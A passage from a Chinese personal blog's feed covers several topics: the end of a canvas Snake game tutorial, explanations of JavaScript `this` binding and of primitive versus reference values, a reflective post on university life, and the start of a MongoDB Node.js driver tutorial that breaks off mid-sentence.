class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">if</span> (key == <span class="number">37</span> &amp;&amp; snake_dir != <span class="number">1</span>) &#123;</span><br><span class="line">                       snake_next_dir = <span class="number">3</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>关于食物，如果食物被吃掉，我们就需要产生新的食物</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// add food</span></span><br><span class="line">  <span class="keyword">var</span> addFood = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      food.x = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * ((canvas.width / <span class="number">10</span>) - <span class="number">1</span>));</span><br><span class="line">      food.y = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * ((canvas.height / <span class="number">10</span>) - <span class="number">1</span>));</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; snake.length; i++) &#123;</span><br><span class="line">          <span class="comment">// 如果食物被吃就增加食物</span></span><br><span class="line">          <span class="keyword">if</span> (checkBlock(food.x, food.y, snake[i].x, snake[i].y)) &#123;</span><br><span class="line">              addFood();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> checkBlock = <span class="function"><span class="keyword">function</span> (<span class="params">x, y, _x, _y</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> (x == _x &amp;&amp; y == _y) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>接下来是核心的函数，根据选择的速度和是否有墙体作为障碍物的设置，让蛇运动起来，并且实现</p><blockquote><p>  1、根据选择slow、norma、fast决定蛇运动速度速度;</p></blockquote><blockquote><p>  2、如果蛇碰到自己==自杀，游戏结束</p></blockquote><blockquote><p>  3、有墙模式碰到墙体，游戏结束</p></blockquote><blockquote><p>   4、无墙模式蛇穿过墙体，从另一侧出现</p></blockquote><blockquote><p>   5、使蛇碰到食物就加入自身身体的一部分，执行增加食物函数</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mainLoop = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">var</span> _x = snake[<span class="number">0</span>].x;</span><br><span class="line">       <span class="keyword">var</span> _y = snake[<span class="number">0</span>].y;</span><br><span class="line">       snake_dir = snake_next_dir;</span><br><span class="line">       <span class="comment">//  0 — up  1 — right   2 — down  3 — left</span></span><br><span class="line">       <span class="keyword">switch</span> (snake_dir) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">               _y--;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">               _x++;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">               _y++;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">               _x--;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       snake.pop();</span><br><span class="line">       snake.unshift(&#123;</span><br><span class="line">           x: _x,</span><br><span class="line">           y: _y</span><br><span class="line">       &#125;)</span><br><span class="line"></span><br><span class="line">       <span class="comment">// --wall</span></span><br><span class="line">       <span class="keyword">if</span> (wall == <span class="number">1</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (snake[<span class="number">0</span>].x &lt; <span class="number">0</span> || snake[<span class="number">0</span>].x == canvas.width / <span class="number">10</span> || snake[<span class="number">0</span>].y &lt; <span class="number">0</span> || snake[<span class="number">0</span>].y == canvas.height / <span class="number">10</span>) &#123;</span><br><span class="line">               showScreen(<span class="number">3</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">//  off 无墙</span></span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, x = snake.length; i &lt; x; i++) &#123;</span><br><span class="line">               <span class="keyword">if</span> (snake[i].x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                   snake[i].x = snake[i].x + (canvas.width / <span class="number">10</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (snake[i].x == canvas.width / <span class="number">10</span>) &#123;</span><br><span class="line">                   snake[i].x = snake[i].x - (canvas.width / <span class="number">10</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (snake[i].y &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                   snake[i].y = snake[i].y + (canvas.height / <span class="number">10</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (snake[i].y == canvas.height / <span class="number">10</span>) &#123;</span><br><span class="line">                   snake[i].y = snake[i].y - (canvas.height / <span class="number">10</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//  Autophagy death</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; snake.length; i++) &#123;</span><br><span class="line">           <span class="keyword">if</span> (snake[<span class="number">0</span>].x == snake[i].x &amp;&amp; snake[<span class="number">0</span>].y == snake[i].y) &#123;</span><br><span class="line">               showScreen(<span class="number">3</span>);</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Eat food</span></span><br><span class="line">       <span class="keyword">if</span> (checkBlock(snake[<span class="number">0</span>].x, snake[<span class="number">0</span>].y, food.x, food.y)) &#123;</span><br><span class="line">           snake[snake.length] = &#123;</span><br><span class="line">               x: snake[<span class="number">0</span>].x,</span><br><span class="line">               y: snake[<span class="number">0</span>].y</span><br><span class="line">           &#125;;</span><br><span class="line">           score += <span class="number">1</span>;</span><br><span class="line">           altScore(score);</span><br><span class="line">           addFood();</span><br><span class="line">           activeDot(food.x, food.y);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// --------------------</span></span><br><span class="line"></span><br><span class="line">       ctx.beginPath();</span><br><span class="line">       ctx.fillStyle = <span class="string">"#111"</span>;</span><br><span class="line">       ctx.fillRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// --------------------</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; snake.length; i++) &#123;</span><br><span class="line">           activeDot(snake[i].x, snake[i].y);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// --------------------</span></span><br><span class="line"></span><br><span class="line">       activeDot(food.x, food.y);</span><br><span class="line"></span><br><span class="line">       setTimeout(mainLoop, snake_speed);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ok以上展示出一些核心部分，构建出一个舞台中一只小蛇的故事.</p><p><video controls="" src="http://gslb.miaopai.com/stream/9Sve8-3osRBmmpEvONt~uKP-WbvOSRLH.mp4?ssig=3a4333a30009844032269e50b9be79b7&time_stamp=1512196508068&cookie_id=&vend=1&os=3&partner=1&platform=2&cookie_id=&refer=miaopai&scid=9Sve8-3osRBmmpEvONt%7EuKP-WbvOSRLH" loop="false" width="100%" height="420">embed: cat.mov</video></p><p>小时候爸妈手机里有一款小游戏叫贪吃蛇。就是一条小蛇，不停地在屏幕上游走，吃各个方向出现的食物，越吃越长。只要蛇头碰到屏幕四周，或者碰到自己的身子，小蛇就立即毙命。方寸的舞台间，亦有无限精彩；</p><p>PS:到现在也没有通关过..现在不知道能不能通关了…</p><p>最后在附上次源码，欢迎fork交流：<a href="https://github.com/okaychen/practice" target="_blank" rel="noopener">https://github.com/okaychen/practice</a>…<br>因为自己测试用的服务器被占用，目前只有做的效果图供大家参考喽.</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 小游戏 </tag>
            
            <tag> Canvas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>this四种绑定方式之间的奇淫技巧</title>
      <link href="/2017/09/14/js-this20170914/"/>
      <url>/2017/09/14/js-this20170914/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>上一篇中，我们对于JavaScript中原始值、复杂值以及内存空间进行了一个深入浅出的总结，这次我们来聊一聊JavaScript中this关键字的深入浅出的用法.</p><p>在 JavaScript 中，this 是动态绑定，或称为运行期绑定的，这就导致 JavaScript 中的 this 关键字有能力具备多重含义，带来灵活性的同时，也为初学者带来不少困惑。希望这篇文章可以解决初学者心中<code>what’s this?</code>的困惑。</p><p>创建函数时，系统会在默认创建一个名为this的关键字，这也就是说this，只能在函数内部使用；从根本上说，由于运期绑定的特性，JavaScript中this的关键字要丰富的多，这完全取决于函数调用的方式：</p><p>　　1）作为函数调用</p><p>　　2）作为对象方法调用</p><p>　　3）使用call，apply调用</p><p>　　4）作为构造函数调用</p><p>我没有按这四种调用方式依次来介绍，但是在例子中都有体现。</p><h1 id="1、如何确定this值？"><a href="#1、如何确定this值？" class="headerlink" title="1、如何确定this值？"></a>1、如何确定this值？</h1><p>我们来看一个例子：1）当从全局域中调用sayFoo函数时，this指向window对象；2）当它作为myObject的一种方法被调用时，this引用myObject；</p><p><fancybox><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170914141956141-1778155654.png" alt=""></fancybox></p><p>通过上面的例子，我们发现this 是基于调用函数的上下文的，考虑一下myObject.sayFoo和sayFoo都指向了相同的函数，然而，调用sayFoo的方式不同，this的值也不同。</p><p>通过这个例子，我们也可以体会到了a、作为函数调用；b、作为对象的方法调用时，this的不同指向</p><h1 id="2、在嵌套函数中用this关键字"><a href="#2、在嵌套函数中用this关键字" class="headerlink" title="2、在嵌套函数中用this关键字"></a>2、在嵌套函数中用this关键字</h1><p>当在嵌套函数内部使用this时，会发生什么事呢？通过下面的例子，我们明显看出嵌套函数内部的this都失去方向，都指向了window对象</p><p><fancybox><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170914142027578-1101692849.png" alt=""></fancybox></p><p>我们在来看一种情况（原理是一样的），我们把一个匿名函数作为参数传递给一个对象的方法中：，当匿名函数在foo.func1（函数内的函数）内部被调用时，匿名函数的this值同样是window对象的引用.</p><p><fancybox><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170914142042469-1689763273.png" alt=""></fancybox></p><h1 id="3、充分利用作用域链研究嵌套函数的问题"><a href="#3、充分利用作用域链研究嵌套函数的问题" class="headerlink" title="3、充分利用作用域链研究嵌套函数的问题"></a>3、充分利用作用域链研究嵌套函数的问题</h1><p>JavaScript的程序员的力量是强大的，为了解决在嵌套函数内部this指向的问题，他们想出了变量代替的方法，可以简单的在父函数使用作用域链来保留对this的引用，以便this不丢失。约定俗成，我们一般把变量定义为that</p><p>我们来看一个例子：</p><p><fancybox><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170914142106360-274712102.png" alt=""></fancybox></p><p>这样，我们就很好的解决了嵌套函数内部this指向的问题</p><h1 id="4、使用call-或apply-控制this值"><a href="#4、使用call-或apply-控制this值" class="headerlink" title="4、使用call()或apply()控制this值"></a>4、使用call()或apply()控制this值</h1><p>我们可以通过apply()或call()来重写/控制this值，以便定义调用函数时this指向哪个对象。“嘿，告诉x函数，调用的时候把z对象作为this值使用”，这样做我们就可以改变JavaScript中决定this值的方式（取代默认模式）</p><p><fancybox><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170914142136672-1021104752.png" alt=""></fancybox></p><p>上述代码使用了call()，但也可以使用apply()。两者区别在于为函数传递参数的方式不同：a、使用call(),参数只是使用逗号分隔的值；b、如果使用apply()，参数值在数组内传递。</p><p>下面使用apply可以达到同样的效果</p><p><fancybox><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170914142148750-521591263.png" alt=""></fancybox> </p><h1 id="5、在用户自定义构造函数内部使用this关键字"><a href="#5、在用户自定义构造函数内部使用this关键字" class="headerlink" title="5、在用户自定义构造函数内部使用this关键字"></a>5、在用户自定义构造函数内部使用this关键字</h1><p>在构造函数中，this默认值的变化与使用call或apply时this默认值变化不同，使用new关键词调用函数时，在构造函数中声明的this引用实例本身</p><p><fancybox><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170914143819407-1242808599.png" alt=""></fancybox></p><p>在使用new关键词调用构造函数时，this引用’即将创建的对象’。如果不使用new关键词，this值将是调用Person的上下文 – 上例中是window对象</p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>this在不同调用方式下的含义 只是JavaScript中一个很小的概念，但是也是我们借此可以深入理解JavaScript函数的执行环境，更进一步帮帮助我们了解闭包等其他概念</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复杂值vs原始值&amp;&amp;内存空间</title>
      <link href="/2017/09/14/js-type20170914/"/>
      <url>/2017/09/14/js-type20170914/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>最近在读《JavaScript启示录》，这本书不是JavaScript的详尽的参考指南，但是把对象作为了解JavaScript的透镜，受益匪浅。</p><p>那么我们先来聊一下JavaScript的原始值（值类型）以及复杂值（引用类型），以及他们在内存空间中的存储，关于他们你可能不清楚的一些事：</p><p>我们先通过一个经典的面试题类型（并不是原题，我即兴发挥）引出我们今天的主题：</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170913231017985-195870781.png" alt=""><br><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170913231023453-1314449337.png" alt=""></p><p>我们已经看出他们的差别，在图一：我们让b = a，改变b的值，发现a并没有改变。在图二：我们让d = c,通过d.name改变对象的name属性，发现c.name也变化了。</p><p>事实上，原始值存储在栈内存中，按值来访问。复杂值（引用类型）在堆内存里面，按引用地址访问；然后我们会想到局部变量和全局变量在内存中的存储：</p><p>下面会具体介绍复杂值、原始值以及他们的一些特性与内存空间：</p><a id="more"></a><h1 id="1、原始值是非对象"><a href="#1、原始值是非对象" class="headerlink" title="1、原始值是非对象"></a>1、原始值是非对象</h1><p>我们老生常谈的JavaScript五大基本的数据类型，null、undefined、number、string、boolean都被视为原始值，因为他们是不可细化的，本身是简单的，不能表示由其他的值组成的值。</p><blockquote><p>这里需要注意的是：与使用字面量语法创建相反，在使用new关键字创建的String，Number,或Boolean值时，创建的实际上是一个复杂对象，此时已不在是原始值。</p></blockquote><p>a、下面对原始值和原生JavaScript对象之间的差异进行了比较：<br><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170913231146563-337622010.png" alt="">　　</p><p>需要注意没有使用new关键词，从构造函数返回的字符、数字、布尔值 对比 使用字面量方法所创建的仍然不是对象。</p><p>b、我们在来对比一下使用new关键字创建的构造函数：</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170913231156532-810228402.png" alt=""></p><blockquote><p>除了new出来的Function()对象返回的是function,其他都是object，其实在JavaScript中对函数定义非常高，因此在引用类型中，typeof能检测出函数的详细类型。</p></blockquote><p>上述代码可以告诉我们：原始值不是对象，原始值的特殊之处是用于表示简单值；</p><h1 id="2、原始值的赋值，存储，比较方式"><a href="#2、原始值的赋值，存储，比较方式" class="headerlink" title="2、原始值的赋值，存储，比较方式"></a>2、原始值的赋值，存储，比较方式</h1><p>a、原始值在“ 面值（face value）”中的存储和操作，理解这一点非常重要，因为原始值是真实值的复制：</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170913231311875-1631648021.png" alt=""></p><p>这里的重点是，原始值是作为不可细化的值进行存储和操作的，引用他们会转移其值：这里的意思也就是原始值（值类型）在内存中每一个值都会存储在对应的变量的中去，也就是一个真实值的”复制”。</p><p>b、原始值的比较采用值比较</p><p>我们通过比较原始值来确定其值在字面上是否相同，</p><p>通过下面的代码来理解“值比较“的概念，并将它与复杂数字进行比较：</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170913231319063-1160059969.png" alt=""></p><p>这里的重点是，在进行比较时，原始值会去检查表示的值是否相等，这里我们要特别和复杂值进行比较（因为复杂值不会去比较值是否相等，而是比较引用地址是否相同）</p><h1 id="3、原始值（String-Number-Boolean）在被用做对象时就像对象"><a href="#3、原始值（String-Number-Boolean）在被用做对象时就像对象" class="headerlink" title="3、原始值（String,Number,Boolean）在被用做对象时就像对象"></a>3、原始值（String,Number,Boolean）在被用做对象时就像对象</h1><p>null和undefined都是非常简单的值，它们不需要构造函数，也没有new操作为自己创建JavaScript值（可以把他们当做操作符来使用即可）</p><p>原始值被当做构造函数创建的一个对象来使用时（注意不使用new），JavaScript会把其转化为一个对象，以便可以使用对象的特性（如方法），而抛弃对象的性质，并将它返回到原始值。</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170913231332547-1514482111.png" alt=""></p><p>上述实例代码，所有的原始值（除null、undefined）都被转化为对象，以便充分利用toString()方法。一旦调用和返回改方法，对象就会被转换成对象值。这样我相信我们能很好的理解标题了</p><h1 id="4、复杂值（复合对象、引用类型）"><a href="#4、复杂值（复合对象、引用类型）" class="headerlink" title="4、复杂值（复合对象、引用类型）"></a>4、复杂值（复合对象、引用类型）</h1><p>本质上，复杂对象其在内存中的大小是未知的，因为复杂对象可以包含任何值：</p><p>下面通过字面量的方法创建一个对象和数组</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170913231400032-907471302.png" alt=""></p><p>相比简单的原始值，原始值不能表示复杂值，而复杂值可以封装任意的JavaScript值</p><h1 id="5、如何存储或复制复杂值"><a href="#5、如何存储或复制复杂值" class="headerlink" title="5、如何存储或复制复杂值"></a>5、如何存储或复制复杂值</h1><p>复杂值是通过引用来进行存储和操作的，这就回到了开始那个问题的图二，理解这一点非常重要。创建一个包含复杂对象的变量时，其值是内存中的一个引用地址。引用一个复杂对象时，使用它的名称（即变量或对象属性）通过内存中的引用地址获取对象值。当我们试图复制一个复杂值的时候，理解这就非常重要了。复杂值复制的过程、其实并不是复制对象，更多的是像复制对象的地址。</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170913231431438-2039701940.png" alt=""></p><p>所以就像上面说过的，复制的是内存堆栈中对象的地址或者引用。</p><h1 id="6、复杂对象比较采用引用比较"><a href="#6、复杂对象比较采用引用比较" class="headerlink" title="6、复杂对象比较采用引用比较"></a>6、复杂对象比较采用引用比较</h1><p>也就是说：复杂对象只有在引用相同的对象（即有相同的引用地址）时才相等：</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170913231437907-916859876.png" alt=""> 　　</p><p>我相信我们已经理解：指向内存中复杂对象的变量，只有在引用相同对的‘地址’的情况下才是相等的，相反，两个单独创建的对象、即使具有相同的类型并拥有完全相同的属性，他们也是不相等的。</p><h1 id="7、复杂对象具有动态属性"><a href="#7、复杂对象具有动态属性" class="headerlink" title="7、复杂对象具有动态属性"></a>7、复杂对象具有动态属性</h1><p>通过这一点，我们可以根据需求为复杂对象有任意多个引用。</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170913233107141-918248776.png" alt=""></p><p>上述代码，objA、pointer1、pointer2都引用了内存中的同一对象，</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170913233609360-1143644352.png" alt=""></p><p>这三个每次调用对象的方法都会叫他‘一个人’<br><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170914001921625-1701844322.png" alt=""></p><p>复杂对象支持动态对象属性，因为我们可以定义对象，然后创建引用，在更新对象、并且所有指向该对象的变量都会’获得’更新.</p><h1 id="8、动态属性支持异变对象"><a href="#8、动态属性支持异变对象" class="headerlink" title="8、动态属性支持异变对象"></a>8、动态属性支持异变对象</h1><p>复杂对象是由动态属性构成的，这一点非常重要，这使得用户自定义对象和大多数原生对象产生突变。通过增加原生对象、来改变JavaScript本身的原生预配置特性：</p><p>下面我们在原生构造函数上存储属性，并在原型对象上，向原生对象添加新方法：</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170913231534250-51088985.png" alt=""></p><p>所以我们明白，JavaScript的对象是动态的，这使得JavaScript对象是可变的。通过自定义我们改变了原生内部的运行机制，你会获得一个自定义版本的JavaScript来处理程序，但是使用一定要谨慎。</p><h1 id="9、两个存储空间：栈-amp-amp-堆"><a href="#9、两个存储空间：栈-amp-amp-堆" class="headerlink" title="9、两个存储空间：栈&amp;&amp;堆"></a>9、两个存储空间：栈&amp;&amp;堆</h1><p> 我们前面也提到了存储空间，在程序运行时，有两个存储空间可用，一个是栈，归属进程本身的；另一个是堆，所有进程共用的：</p><p>然后就很好理解了，因为局部变量声明在函数周期内部，在函数结束时其生命周期也就结束了，其存储空间位于栈中，当进入函数时，会根据函数内部需求，在栈申请一段内存空间，供局部变量使用。当局部变量生命周期结束后（该函数结束），在栈上释放。</p><p>由于进程栈的空间是有限的，所以</p><p>1）要避免申请占用空间较大的局部变量，</p><p>2）避免函数嵌套层数过多，这些都可能引起栈空间不够导致程序崩溃。</p><p>关于数据结构中栈和堆，后面还会进一步的学习总结</p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>相信到这里我们对js中的原始值、复杂值、以及他们的特性、在内存中的存储有了比较深入的理解，那么让我们开始准确我们的JavaScript世界观系列，因为我从高中毕业后接触前端，对原生的热爱程度远远大于jQuery等类库。如果想实现JavaScript类库或者框架，应该打开“引擎盖”看看，了解发动机的情况。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这一年，是责任与奋勉齐驱并进</title>
      <link href="/2017/09/09/life-aboutLife20170909/"/>
      <url>/2017/09/09/life-aboutLife20170909/</url>
      
        <content type="html"><![CDATA[<p>从16年刚步入校园，转眼之间迎来了我的大二生活。</p><p>在很多人眼中，刚步入大学的新生是懵懂无知、没有目标的一年，对未来的生活没有想象，对于自己的明天或许仍然没有选择；但是我俨然过成了激情中又充满安稳的一年（这或许在别人眼中是乏味的吧），因为我最庆幸的是，我一开始就坚定着我的目标，至少直到现在我没有动摇，而且在接下来的大二生活，我仍然不想动摇，我会继续着我的目标。</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170909003809929-1215489348.png" alt=""></p><a id="more"></a><p>对于做开发的人来说，他们或许没有见过凌晨四点的太阳，因为凌晨四点他们或许刚刚拖着身躯躺下，进入睡梦；或许也没有见过凌晨两点钟的星空，因为学校的房间没有天窗 emoji <a href="至少我几个月都是那样，寝室只是白天洗漱的地方">偷笑</a>，我想一定是有一种力量在支撑着他们，我最佩服的那个人，是《异类》中的比尔·乔伊，和他的那段大学生活…</p><p>　  做开发的我们都是惺惺相惜的吧，因为只有深刻经历过才会体会到这一段新路历程，至少我跟小师傅是这样，今年秋招刚刚鸣起钟响，小师傅已经顺利的拿到360的offer，你相信我：每一段看似风平浪静的现在都有一段暗潮汹涌的过去，他的那一段我却亲眼所见所感；</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170909003508507-403180257.png" alt=""></p><p>埋下一些避雷针：</p><p>1、要摒弃浮躁的心态，踏实钻研，对于前端先快后慢的学习曲线，要为“精通”二字负责</p><p>2、广泛涉猎前端书籍，开始读源码计划，我觉得读书最大的好处就是提高我们的分辨力，提升我们的认知能力和知识水平。你相信我如果单凭《JavaScript权威指南》这一本书去入门和持久阅读下去，并不是一个理智的选择。恰恰相反，应该去涉猎各个书籍的精华，书籍是最单纯的，是在没有办法和前辈大牛面对面交流的情况下我们最好的选择。但是需要给自己一个计划，因为并不是每一次‘穿越’都会成功。</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170909003244007-922418641.png" alt=""></p><p>3、需要向外扩展自己的知识面，适时开始自己的three.js计划，读node相关书籍，比如《node学习指南》，《node即学即用》…我的收获是无法比拟的，但是有一点就是现在技术更迭快。书籍自然是有些跟不上API文档更新的速度，我需要让自己即时适应这些更迭，并提升自己的判别能力，所以我看书的时候喜欢把最新的文档也打开。 </p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170909002920897-2080061978.png" alt="">)<img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170909003056179-2010634031.png" alt=""></p><p>当我课上听到管理信息系统的老师说编程是是一种‘体力劳动’的时候，我又想起了阮一峰教授写的《母鸡与前端工程师》，心里多少也有些痛楚。</p><p>　　给自己安利这篇文章提醒自己，自己已经是大二的学长，希望可以把我们工作室前端我的这份凝聚力量的传递下去</p><p>　　2017年秋-2018年夏，这一年，是燃烧青春的一年，是火花迸发的一年，是责任与奋勉齐驱并进的一年。</p>]]></content>
      
      
      <categories>
          
          <category> 岁言心语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 岁言心语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mongodb原生node驱动</title>
      <link href="/2017/09/02/node-mongodb-connection20170902/"/>
      <url>/2017/09/02/node-mongodb-connection20170902/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>最近读《node.js学习指南》，对于mongodb没有介绍太多的工作原理，但是对于一个前端开发者，即使你还没有用过这种数据库也可以让你很好的理解和使用</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170902035102780-1333013103.png" alt="">   　　</p><p>一本非常好的介绍node.js的书，我一直把他放在触手可及的地方。　　–Mike Amundsen</p><p>MongoDB Native Node.js Driver模块是mongodb自带的node的驱动，这个驱动发出的mongodb指令和mongodb客户端发出的指令基本一致。</p><a id="more"></a><h1 id="准备开始"><a href="#准备开始" class="headerlink" title="准备开始"></a>准备开始</h1><p>　　1、首先我们应该确保我们的mongodb数据库本地安装可以正常运行，如果安装过程到遇到了问题可以简单参考我的上一篇博客（window下mongodb的配置与安装）</p><p>　　2、然后我们需要新建一个项目<nodeLearn> mkdir nodeLearn ,创建一个app.js文件作为项目启动文件。</p><p>　　3、然后我们需要在项目文件中安装MongoDB Native Node.js Driver： npm install mongodb 　</p><p>　　4、开始</p><p>1）引入模块，使用mongodb驱动，创建mongodb.Server对象来建立数据库的连接：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mongodb = <span class="built_in">require</span>(<span class="string">'mongodb'</span>)　　</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = <span class="keyword">new</span> mongodb.Server(<span class="string">'localhost'</span>,<span class="number">27017</span>,&#123;<span class="attr">auto_reconnect</span>:<span class="literal">true</span> &#125;)</span><br></pre></td></tr></table></figure><blockquote><p>注：Server构造函数的前两个参数分别是localhost和27017默认端口，第三个参数可选，选项被设置为true，表示如果连接断开driver会自动进行重连（还有一个参数pollSize，决定并发的TCP连接数量，我还没有接触到= =）。</p></blockquote><p>2）使用mongodb.Db对象创建数据库</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> db = <span class="keyword">new</span> mongodb.Db(<span class="string">'mydb'</span>,server)</span><br></pre></td></tr></table></figure><blockquote><p>注：第二个参数表示建立已经连接好的Mongodb server</p></blockquote><h1 id="Mongodb-Collection"><a href="#Mongodb-Collection" class="headerlink" title="Mongodb Collection"></a>Mongodb Collection</h1><p>在MongoDB中并没有表的概念，我们需要一个集合.</p><p>1、在数据库中创建一个collection集合对象</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">db.createCollection(<span class="string">'mycollection'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,collection</span>)</span>&#123; &#125;)</span><br><span class="line"></span><br><span class="line">db.collection(<span class="string">'mycollection'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,collection</span>)</span>&#123; &#125;)</span><br></pre></td></tr></table></figure><blockquote><p>注：使用create和不使用有一些区别，使用create表示立即创建，如果对一个已经存在的collection使用createcollection方法，也可以直接访问该collection-driver，并不会覆盖。不使用create并没有创建实际的collection.</p></blockquote><p>2、在数据库中彻底销毁一个collection</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">db.dropCollection(<span class="string">'mycollection'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,result</span>)</span>&#123; &#125;)</span><br></pre></td></tr></table></figure><h1 id="为collection添加数据"><a href="#为collection添加数据" class="headerlink" title="为collection添加数据"></a>为collection添加数据</h1><p>　　在添加数据之前，我们要知道node mongodb driver 与mongodb数据类型存在一种映射关系（但是对于数据转换背后的处理机制我还不是理解的很清楚，这里为之后的一篇博客做伏笔- -）</p><p>　　添加数据：</p><p>　　　1、先用remove方法删除已有的collection文档以防止创建失败，</p><p>　　　